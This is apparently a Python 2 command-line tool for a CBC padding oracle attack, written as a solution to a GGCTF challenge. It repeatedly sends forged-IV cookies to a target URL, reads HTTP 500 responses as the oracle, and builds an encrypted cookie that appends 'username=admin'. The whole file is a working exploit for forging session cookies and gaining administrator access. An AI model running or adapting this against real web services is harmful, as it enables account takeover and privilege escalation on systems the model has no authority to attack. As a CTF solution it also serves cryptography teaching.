#!/usr/bin/env python
# -*- coding:utf-8 -*-

from optparse import OptionParser
import requests
import struct

class POAttack():
	"""
	以GGCTF的一题为例写的Padding Oracle Attack
	By Hcamael
	"""
	def __init__(self, options):
		self.url = options.url
		self.length = options.length
		cookie = options.cookie.split("=")
		assert len(cookie) == 2
		self.c_name = cookie[0]
		c = cookie[1].decode('hex')
		if len(c) % self.length != 0 or len(c) == self.length:
			raise "cookie error!"
		self.sign = c[-self.length:].encode('hex')
		self.result = self.sign
		self.unenc = ""
		if options.plain:
			self.plain = options.plain
			self.pad_plain = (self.length - len(self.plain) % self.length)
			self.pad_iv = c[-self.length*2: -self.length]
		else:
			self.pad_plain = 0

	def attack(self, msg):
		self.a_str = msg
		pad = (self.length - len(self.a_str) % self.length)
		self.a_str += chr(pad) * pad
		assert len(self.a_str) % self.length == 0
		self.l_str = list(struct.unpack("16s"*(len(self.a_str)/self.length), self.a_str))

		self.iv = "\x00" * self.length
		for x in xrange(len(self.l_str)):
			print "+===================================================+"
			print "plaintext: %s" % self.l_str[-x-1].encode('hex')
			result = self.padding()
			self.unenc = result + self.unenc
			assert len(result) == len(self.l_str[-x-1]) == self.length
			tmp = ""
			for y in xrange(len(result)):
				tmp += chr(ord(result[y])^ord(self.l_str[-x-1][y]))
			self.sign = tmp.encode('hex')
			self.result = self.sign + self.result
		return (self.result, self.unenc.encode("hex"))

	def padding(self):
		tmp_iv = list(self.iv)
		result = list("\x00" * self.length)
		if not self.pad_plain:
			n = 0
		else:
			n = self.pad_plain
			for i in xrange(n):
				result[-i-1] = chr(n ^ ord(self.pad_iv[-i-1]))
			self.pad_plain = 0
		for x in xrange(n, self.length):
			if n != x:
				raise "Padding Error!"
			for i in xrange(x):
				tmp_iv[-i-1] = chr((x+1) ^ ord(result[-i-1]))
			for y in xrange(256):
				tmp_iv[-x-1] = chr(y)
				tmp = "".join(tmp_iv).encode('hex')
				cookie = {self.c_name: "d379b40e4da82e7d080d689d6fed5942671dde6f." + tmp + self.sign}
				try:
					req = requests.get(self.url, cookies=cookie, verify=False, allow_redirects=False)
				except:
					print result
					print self.result
					exit()
				if req.status_code != 500:
					result[-x-1] = chr(y^(x+1))
					print "iv xor plaintext = %s" % "".join(result[-x-1:]).encode('hex')
					n += 1
					break
		return "".join(result)

def add_parse():
	parser = OptionParser()
	parser.add_option(
		"--url",
		dest="url",
		help="Please input the url")
	parser.add_option(
		"--l",
		dest="length",
		type="int",
		help="Please input the iv's bytes length")
	parser.add_option(
		"--cookie",
		dest="cookie",
		help="Please input the url's cookie")
	# parser.add_option(
	# 	"--s",
	# 	dest="a_str",
	# 	help="Please input you want to construct a string")
	parser.add_option(
		"--p",
		dest="plain",
		help="Please input if you know cookie's pliantext")
	return parser

def main():
	parser = add_parse()
	(options, args) = parser.parse_args()
	if not (options.url and options.length and options.cookie):
		parser.parse_args(['cbc-padding-oracle-attack.py', '-h'])
		exit(-1)
	options.a_str = "username=a\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x50&username=admin"
	cbca = POAttack(options)
	r, s = cbca.attack(options.a_str)
	print "+-------------------+"
	print "|       Result     |"
	print "+--------------------+"
	print "Your want string's cookie: " + r
	print "AES decrypt result: " + s

if __name__ == '__main__':
	main()